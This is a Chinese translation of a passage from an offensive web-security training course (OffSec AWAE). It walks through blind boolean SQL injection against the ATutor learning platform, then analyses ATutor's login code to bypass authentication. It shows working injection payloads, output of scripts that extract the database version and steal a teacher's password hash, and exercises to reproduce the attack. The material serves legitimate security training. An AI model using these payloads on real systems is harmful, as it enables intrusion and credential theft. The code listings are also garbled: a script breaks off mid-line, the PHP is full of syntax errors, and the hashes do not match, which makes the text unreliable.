
在此，值得提到的是，将结果字符转换为数值 ASCII 值并进行比较是一种良好的做法。这样做的主要目的是为了避免任何其他的有效负载（`payload`）限制，例如在注入字符串中使用引号。虽然对于这个特定的漏洞并不如此（我们只需要避开空格），但这是你应该习惯的写法。在 `MySQL` 中，执行此转换的相应函数是`ascii(32)`。

```
mysql> select//+ascii(substring(select//+version()),1,1)=52;
| ascii(substring(select version()),1,1))=52 |
| 0 |
| 1 row in set (0.00 sec)
mysql> select//+ascii(substring(select//+version()),1,1)=53;
| ascii(substring(select version()),1,1))=53 |
| 1 |
| 1 row in set (0.00 sec)
```

列表 100 - 使用`ascii`函数避免有效负载限制

现在让我们使用`MySQL`布尔查询在浏览器中构造并测试整个注入：

失败查询（`False Query`）：

`q=test%27//*/or//*/**ascii(substring(select//+version()),1,1))=52%23`

成功查询（`True Query`）：

`q=test%27));//or//*/**ascii(substring(select//+version()),1,1))=53%23`

列表 101 - `TRUE`/`FALSE` `MySQL version()`查询

![](img/5d1c2c08c609e4691e93ba5fa2d52a8a_110_0.png)

32 https://www.w3resource.com/mysql/string-functions/mysql-ascii-function.php

`AWAE`版权 © 2019 `Offsec Services Ltd.` 保留所有权利。110

# 攻击性安全

图 71：`MySQL version()`真查询返回了预期的结果集

太好了！一切都按照我们的计划进行。我们终于达到了可以编写脚本、利用在本模块中研究的`SQL`注入漏洞以及刚刚掌握的`MySQL version()`布尔子查询，自动从`MySQL`数据库中检索数据的程度。我们需要对子查询进行调试，并遍历`result()`函数的每一个字符，将其与`ASCII`字符集³²(32-126) 中的所有可能字符进行比较，结果在列表 102 中。

```python
import requests
import sys
def searchfriends_sqli(ip
```

³² en.wikipedia.org/wiki/ASCII

# 攻击性安全

```python
if __name__ == "__main__":
    main()
```

列表 102 - 数据库提取原型证明脚本

如列表 103 所示，我们最终的证明脚本已成功提取了数据库版本！

```
kali@kali:~/atutor python poc3.py atutor
(+) Retrieving database version...
5.5.47-+debug8-log
(+) done!
kali@kali:~/atutor$
```

列表 103 - 通过盲注`SQL`注入漏洞提取`MySQL`版本

### 3.6.3 练习

- 1. 重现本节描述的攻击。确保你可以检索数据库版本。

- 2. 修改脚本以检查`ATutor`环境下的数据库用户是否正在以`DBA`身份运行。

# 3.64 进阶

审查`index_public.php`中的剩余代码。尝试识别通往漏洞函数的另一个路径，并相应地修改最终的数据外泄脚本。

# 3.7 绕过 ATutor 身份验证

到目前为止，我们已经找到了从漏洞的`ATutor`数据库中检索任意信息的方法，虽然这是一个进步，但我们需要看到如何利用这些信息。一个显而易见的选择是检索用户凭据，考虑到现代应用程序很少存储明文凭据（尽管确实存在），我们只能检索密码哈希值。`ATutor`也是如此，即使拿到密码哈希值，我们仍然需要进行暴力破解攻击才可能获取任何明文密码。

另一个选项是调查登录实现并识别任何潜在的缺陷。由于密码破解差异很大，我们将深入查看`ATutor`应用程序中的日志实现。

首先，使用`Burp`代理捕获一个有效的登录请求，以便为我们的分析提供良好的起点。在向`Web`应用程序发送登录请求时，捕获到了一个与下图类似的请求：

# 攻击性安全

![](img/5d1c2c08c609e4691e93ba5fa2d52a8a_113_0.png)

```
POST /ATutor/login.php HTTP/1.1
Host: atutor
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,q=0.5
Accept-Encoding: gzip, deflate
Referer: http://atutor/login.php
Cookie: ATutor=db5bb12krgz21mj4hcjrql;flash=no
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
```

## 高级Web攻击与利用

```php
60: if (isset($cookie_login, $cookie_password)) && isset($_POST['submit'])) {
61:     /* auto login */
62:     $this_login = $cookie_login;
63:     $this_password = $cookie_password;
64:     $auto_login = true;
65:     $used_cookie = true;
66: } else if (isset($_POST['submit'])) {
67:     /* form login * */
68:     $this_password = $_POST['form_password_hidden'];
69:     $this_login = $_POST['form_login'];
70:     $auto_login = isset($_POST['auto']) ? $_POST['auto'] : 0;
71:     $used_cookie = false;
72: } if (isset($_POST['submit'])) {
73:     /* form post on account registration/ */
74:     $this_password = $_POST['form_password_hidden'];
75:     $this_login = $_POST['form_login'];
76:     $auto_login = isset($_POST['auto']) ? $_POST['auto'] : 0;
77:     $used_cookie = false;
78: }
```

列表 108 - 通过特定条件设置`$this_login`和`$this_password`变量

由于我们不是访客用户，而是可以在`POST`请求中设置`submit`参数，因此我们将关注`login_functions.php`第 66 行的`else`分支。上面的代码分别设置了`$this_login`和`$this_password`变量。我们也会留意这一点。

接下来，我们考虑另一段代码，它对我们的关注点无关，尽管有几点需要指出：

```php
080: if (isset($this_login, $this_password)) {
081:     if (version_compare(PHP_VERSION, '5.1.0', '>=')) {
082:         session_regenerate_id(TRUE);
083:     }
084: }
085: if (isset($_GET['course'])) {
087:     $_POST['form_course_id'] = intval($_GET['course']);
088: } else {
089:     $_POST['form_course_id'] = intval($_POST['form_course_id']);
090: }
091:     $this_login = $addslashes($this_login);
092:     $this_password = $addslashes($this_password);
093: 
094: //检查此账户是否超过了最大尝试次数
095: $rows = queryDB("SELECT login, attempt, expiry FROM %smember_attempt
096: WHERE login='%s", $this_login, TRUE);
097:
098: if ($rows && count($rows) > 0) {
099:     list($attempt_login_name, $attempt_login, $attempt_expiry) = $rows;
100: } else {
101:     $attempt_login_name = '';
102:     $attempt_login = 0;
103:     $attempt_expiry = 0;
104: }
105:   if($attempt_expiry > 0 && $attempt_expiry < time())
106:     //如果已过期则清除旧记录
107:     queryDB("DELETE FROM %member_login WHERE login='%%s",
108:     array(TABLE_PREFIX, $this_login);
109:     $attempt_login = 0;
110:     $attempt_expiry = 0;
111: }
```

列表 109 - 额外的验证逻辑

由于我们在列表 108 中所示的`$this_login`和`$this_password`变量已经设置，我们知道我们将进入第 80 行的分支。那么，如果回想上一节的内容，第 91 行和 92 行的`$addslashes`函数调用实际上不会过滤任何内容。这段代码块的其余部分对我们没有任何影响，因此我们可以继续。

最后，我们移动到身份验证逻辑中最关键的部分，从第 111 行开始。

```php
111: if ($used_code)
112:   #A7755: 密码现在使用加盐存储
113:   $rows = queryDB("SELECT password, last_login FROM %members WHERE
114: login='%%s", array(TABLE_PREFIX, $this_login), TRUE);
115:   $cookieRow = $rows[0];
116:   $saltedPassword = $hash('sha512', $cookieRow['password']) . hash('sha512',
117: $cookieRow['last_login']);
118:   $row = queryDB("SELECT member_id, login, first_name, second_name,
119: last_name, preferences, password AS pass, language, status, last_login FROM %members
120: WHERE login='%%s' AND email='%%s', array(TABLE_PREFIX, $this_login, $saltedPassword,
121: $this_password), TRUE);
122: } else {
123:   $row = queryDB("SELECT member_id, login, first_name, second_name,
124: last_name, preferences, password AS pass, language, status, last_login FROM %members
125: WHERE login='%%s' OR email='%%s' AND CONCAT(password, '%%s')='%%s",
126: array(TABLE_PREFIX, $this_login, $SESSION['token']),
127: TRUE);
128: }
```

列表 110 - 必须在第二个分支

正如列表 110 所示，我们没有使用代码进行验证。在第 114 行，应用程序最终处理身份验证查询，如果我们关注该查询的重要部分，会看到：

```php
... WHERE login='%%s' OR email='%%s') AND CONCAT(password, '%%s')='%%s", array(TABLE_PREFIX, $this_login, $this_password);
```

列表 111 - 身份验证查询

首先，我们可以看到`$this_login`和`$this_password`变量被正确地传递给了`queryDB`。与本章开头描述的漏洞不同，这里没有`SQL`注入。然而，让我们关注决定身份验证结果的准则。如果我们进一步放大并将占位符替换为适当的值，将得到：

```
AND SHA1(CONCAT(password, $_SESSION['token']))=$this_password;
```

列表 117 - 身份验证查询的关键部分

我们可以控制`session token`，在列表 108 中可以看到`$this_password`也由我们控制。因此我们控制了这个等式的大部分。密码参数似乎是唯一的，当然，我们从上一节获取了它！

最后，如果我们成功让此查询返回结果，我们将登录，如下代码所示：

```php
117: } else
118:     $row = queryDB("SELECT member_id, login, first_name, second_name,
119: last_name, preferences, language, status AS pass, last_login FROM %members
120: WHERE login='%%s' OR LIKE '%%s') AND SHA1(CONCAT(password, '%%s'))='%%s",
121: array(TABLE_PREFIX, $this_login, $_session, true);
122: }
128: } else if (count($row) > 0) {
129:     $_SESSION['user_id'] = true;
130:     $_SESSION['member_id'] = intval($row['member_id']);
131:     $_SESSION['login'] = $row['login'];
132:     if ($row['preferences'] == "") {
133:         assign_session_prefs(unserialize(stripslashes($config["def_defaults"])));
134:     else
135:         assign_session_prefs(unserialize(stripslashes($row['preferences'])));
136:     $_SESSION['is_guest'] = 0;
137:     $_SESSION['language'] = $row['language'];
138:     $_SESSION['course_id'] = 0;
139:     $now = date("Y-m-d H:i:s");
```

列表 112 - 如果身份验证查询返回结果，登录尝试将通过

```bash
kali@kali:~/atutor python gethash.py tutor
(+) Retrieving username...
teacher
(+) done!
(+) Retrieving password...
8635fc4e2a0c7d92dee40eabf2fed76d577
(+) done!
(+) Credentials: teacher / 8635fc4e2a0c7d92dee40eabffed76d577
kali:~/atutor
```

如所示，通过更新之前的原型脚本，能够窃取教师用户的密码哈希值。此时，我们已经拥有并控制了满足身份验证查询所需的一切。

列表 113 - 使用`ATutor SQL`注入

### 3.7.1 练习

修改并使用以下原型来获取教师凭据
